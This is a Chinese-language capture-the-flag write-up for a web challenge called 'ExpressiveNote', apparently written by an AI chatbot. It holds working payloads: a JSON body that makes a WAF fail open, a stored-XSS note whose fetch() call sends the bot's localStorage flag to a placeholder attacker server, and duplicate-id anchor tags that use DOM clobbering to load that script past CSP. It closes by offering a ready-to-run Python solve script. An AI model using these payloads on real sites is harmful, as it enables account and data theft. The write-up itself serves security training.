
---

## 🚩 题目信息

- **题目名称**：ExpressiveNote
    
- **预设账号**：`root` / `0624`
    
- **核心考点**：WAF 异常逃逸（Fail-Open）、DOM Clobbering（DOM 破坏）、存储型 XSS、绕过 CSP
    

---

## 🕵️ 解题步骤

### 第一步：分析 WAF 漏洞并绕过

源码中的 `profileUpdateWaf` 函数使用递归扫描请求体 。

JavaScript

```
if (data && data.includes(keyword)) { ... }
```

**漏洞点**：如果 `data` 是数字类型，调用 `.includes()` 会抛出 `TypeError` 。由于该逻辑被包裹在 `try...catch` 中且报错后直接执行 `next()`，攻击者可以利用此特性逃逸 。

**Payload**（通过 `POST /api/profile/update` 发送 JSON）：

JSON

```
{
  "antidote": 123,
  "config": {
    "features": {
      "enableLegacyWidget": true
    }
  }
}
```

- **效果**：WAF 处理 `123` 时崩溃跳出，导致后面的 `enableLegacyWidget` 关键字未被检测，成功开启隐藏功能 。
    

### 第二步：准备 XSS 载荷

由于题目有 CSP 限制（`script-src 'self'`），无法直接执行内联脚本，但可以加载同源 JS 。 利用 `/notes/create` 功能创建一个笔记，内容为窃取 Flag 的代码：

JavaScript

```
fetch('http://你的服务器IP:端口/' + localStorage.getItem('flag'));
```

- **记录 ID**：假设生成的笔记 ID 为 `abc12345`。此时访问 `/notes/abc12345` 会返回该 JS 内容 。
    

### 第三步：DOM Clobbering 劫持配置

开启 `enableLegacyWidget` 后，`profile.js` 会尝试加载 `window.widgetLoaderConfig.url` 。

JavaScript

```
script.src = window.widgetLoaderConfig.url; 
```

由于 `bio` 使用了 `DOMPurify` 净化但放行了 `<a>` 标签，我们可以通过 DOM 破坏来控制该变量 。

**Payload**（更新 `bio` 内容）：

HTML

```
<a id="widgetLoaderConfig"></a>
<a id="widgetLoaderConfig" name="url" href="/notes/abc12345"></a>
```

- **原理**：浏览器会将多个同 ID 元素集合成一个 `HTMLCollection`。访问 `widgetLoaderConfig.url` 时会指向第二个 `<a>` 标签，其 `toString()` 方法会返回 `href` 属性的值 。
    

### 第四步：触发并获取 Flag

1. 确认你的 Profile 页面（`/profile/root`）源代码中已包含上述 `<a>` 标签 。
    
2. 点击 **Report to Admin** 。
    
3. Bot 会登录并访问你的 Profile 页面。由于 Bot 本地存有 Flag，它会加载你的恶意笔记 JS 并将 Flag 发送到你的监听服务器 。
    

---

## 💡 总结

本题的精髓在于 **Fail-Open** 的安全意识缺失，以及对前端 **DOM 树渲染特性** 的深度利用。即使有强大的 CSP 防护，通过劫持同源资源加载路径依然可以达成攻击 。

你想让我为你生成一份可以直接在终端运行的 **自动化解题脚本 (Python)** 吗？